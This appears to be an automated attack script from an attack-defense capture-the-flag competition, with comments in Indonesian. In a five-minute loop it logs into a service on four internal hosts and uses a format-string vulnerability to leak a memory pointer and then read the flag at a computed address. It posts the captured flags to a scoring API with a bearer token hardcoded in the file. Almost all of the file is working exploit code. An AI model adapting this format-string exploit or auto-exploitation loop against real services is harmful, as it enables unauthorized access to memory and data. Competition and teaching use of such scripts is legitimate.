import socket, time, re, struct, json, urllib.request, urllib.error
from datetime import datetime

# ==== KONFIGURASI ====
GAME_ID = 27
API_TOKEN = "ad_OeEa7WYSWvgV2uAYoSUbwqwQTgDnsuGaUtaQJe_jwHo"
SUBMIT_URL = f"https://cosmos.porossec.my.id/api/Game/{GAME_ID}/Ad/Submit"

SLEEP_SECONDS = 300  # 5 menit

TARGETS = [
    ("10.13.40.14", 17272),
    ("10.13.40.7", 17272),
    ("10.13.40.17", 17272),
    ("10.13.40.20", 17272),
]

LOG_FILE = "auto_ad.log"

def log(msg):
    line = f"[{datetime.now().isoformat(timespec='seconds')}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

# ==== EXPLOIT ====
def conn(ip, port):
    s = socket.create_connection((ip, port), timeout=8)
    s.settimeout(3)
    time.sleep(0.3)
    try: s.recv(4096)
    except: pass
    return s

def cmd(s, c, t=0.4):
    s.sendall(c)
    time.sleep(t)
    try: return s.recv(8192)
    except: return b""

def get_tail(o):
    tail = o.split(b"Last tag: ")[1]
    return tail.split(b"\n")[0]

def exploit(ip, port):
    try:
        s = conn(ip, port)
        r = cmd(s, b"REGISTER\n")
        m = re.search(rb"OK (\d+) ([0-9a-f]+)", r)
        if not m:
            log(f"[{ip}] REGISTER gagal: {r}")
            return None
        uid, pw = m.group(1), m.group(2)
        cmd(s, b"LOGIN " + uid + b" " + pw + b"\n")

        fmt_leak = b"AAAA." + b"%81$p"
        cmd(s, f"SETTAG {len(fmt_leak)}\n".encode() + fmt_leak + b"\n")
        o1 = cmd(s, b"WHOAMI\n", 0.4)
        leaked = get_tail(o1).split(b".")[1].strip()
        user_ptr = int(leaked, 16)
        flag_addr = user_ptr - 0x430

        prefix_s = b"%83$s"
        pad_s = b"A" * (8 - len(prefix_s))
        fmt_flag = prefix_s + pad_s + struct.pack("<Q", flag_addr)
        cmd(s, f"SETTAG {len(fmt_flag)}\n".encode() + fmt_flag + b"\n")
        o_flag = cmd(s, b"WHOAMI\n", 0.4)

        m2 = re.search(rb"flag\{[^}]+\}", o_flag)
        if m2:
            flag = m2.group(0).decode()
            log(f"[{ip}] FLAG: {flag}")
            return flag
        else:
            log(f"[{ip}] no flag match, raw: {o_flag}")
            return None
    except Exception as e:
        log(f"[{ip}] ERROR: {e}")
        return None

# ==== SUBMIT ====
def submit_flags(flags):
    if not flags:
        log("Gak ada flag baru buat disubmit.")
        return
    body = json.dumps({"flags": flags}).encode()
    req = urllib.request.Request(
        SUBMIT_URL,
        data=body,
        method="POST",
        headers={
            "Authorization": f"Bearer {API_TOKEN}",
            "Content-Type": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            log(f"SUBMIT STATUS: {resp.status} | {resp.read().decode()}")
    except urllib.error.HTTPError as e:
        log(f"SUBMIT FAILED [{e.code}]: {e.read().decode()}")
    except Exception as e:
        log(f"SUBMIT ERROR: {e}")

# ==== MAIN LOOP ====
def run_once():
    flags = []
    for ip, port in TARGETS:
        flag = exploit(ip, port)
        if flag:
            flags.append(flag)
    log(f"FLAGS COLLECTED: {flags}")
    submit_flags(flags)

if __name__ == "__main__":
    log("=== AUTO A/D LOOP STARTED ===")
    while True:
        start = time.time()
        try:
            run_once()
        except Exception as e:
            log(f"RUN_ONCE FATAL ERROR: {e} -- lanjut ke putaran berikutnya")
        elapsed = time.time() - start
        wait = max(0, SLEEP_SECONDS - elapsed)
        log(f"Putaran selesai dalam {elapsed:.1f}s, sleep {wait:.1f}s...\n")
        time.sleep(wait)
